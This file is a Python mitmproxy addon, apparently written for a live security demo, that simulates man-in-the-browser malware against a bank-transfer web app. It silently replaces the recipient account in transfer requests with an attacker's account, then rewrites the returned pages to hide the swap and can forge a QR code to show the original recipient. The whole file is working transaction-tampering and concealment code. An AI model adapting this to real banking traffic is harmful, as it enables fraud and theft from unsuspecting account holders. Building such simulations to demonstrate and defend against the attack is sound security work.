"""Man-in-the-browser simulation for the live demo.

Run on the victim laptop:  mitmdump -s attacker/mitb_addon.py --listen-port 8080 --ssl-insecure
Point the victim browser at proxy 127.0.0.1:8080 and trust the mitmproxy CA
(http://mitm.it). This models malware that controls the browser.

Environment:
  MITB_ACCOUNT   attacker account (default 0999888777)
  MITB_NAME      attacker display name (default LE VAN M)
  MITB_FORGE_QR  "1" to also replace the QR with one showing the intended
                 recipient (scenario S4; needs segno in mitmproxy's interpreter,
                 i.e. run mitmdump from the project venv: pip install -e ".[attack]")

Only stdlib (+ optional segno) is used because mitmproxy runs in its own environment.
"""
import base64
import json
import logging
import os
import re

from mitmproxy import http

ATTACKER_ACCOUNT = os.environ.get("MITB_ACCOUNT", "0999888777")
ATTACKER_NAME = os.environ.get("MITB_NAME", "LE VAN M")
FORGE_QR = os.environ.get("MITB_FORGE_QR") == "1"
QR_DIV = re.compile(r'<div id="qr" data-payload="(tba1:[A-Za-z0-9_-]+)">.*?</div>', re.DOTALL)
log = logging.getLogger("mitb")


def _b64d(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def _b64e(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")


def forge_payload(payload: str, to: str, to_name: str) -> str:
    tx = json.loads(_b64d(payload[len("tba1:"):]))
    tx["to"], tx["to_name"] = to, to_name
    canonical = json.dumps(tx, sort_keys=True, separators=(",", ":"), ensure_ascii=True).encode("ascii")
    return "tba1:" + _b64e(canonical)


def rewrite_html(html: str, attacker_account: str, attacker_name: str, original_to: str, original_name: str | None) -> str:
    html = html.replace(attacker_account, original_to)
    if original_name:
        html = html.replace(attacker_name, original_name)
    return html


def forge_qr_div(html: str, to: str, to_name: str) -> str:
    match = QR_DIV.search(html)
    if not match:
        return html
    try:
        import segno
    except ImportError:
        log.error("segno is not installed in the mitmproxy environment; QR left untouched")
        return html
    payload = forge_payload(match.group(1), to, to_name)
    svg = segno.make(payload, error="m").svg_inline(scale=4)
    return html[:match.start()] + f'<div id="qr" data-payload="{payload}">{svg}</div>' + html[match.end():]


class MitB:
    def __init__(self):
        self.names: dict[str, str] = {}
        self.original_to: str | None = None

    def request(self, flow: http.HTTPFlow) -> None:
        if flow.request.method == "POST" and flow.request.path == "/transfer":
            form = flow.request.urlencoded_form
            original = form.get("to")
            if original and original != ATTACKER_ACCOUNT:
                self.original_to = original
                form["to"] = ATTACKER_ACCOUNT
                log.warning("[MitB] recipient %s -> %s", original, ATTACKER_ACCOUNT)

    def response(self, flow: http.HTTPFlow) -> None:
        if flow.response is None:
            return
        if flow.request.path.startswith("/api/lookup") and flow.response.status_code == 200:
            try:
                data = json.loads(flow.response.get_text())
                self.names[data["account"]] = data["name"]
            except (ValueError, KeyError):
                pass
            return
        if not self.original_to or "text/html" not in flow.response.headers.get("content-type", ""):
            return
        html = flow.response.get_text()
        name = self.names.get(self.original_to)
        if FORGE_QR and name:
            html = forge_qr_div(html, self.original_to, name)
        flow.response.set_text(rewrite_html(html, ATTACKER_ACCOUNT, ATTACKER_NAME, self.original_to, name))


addons = [MitB()]
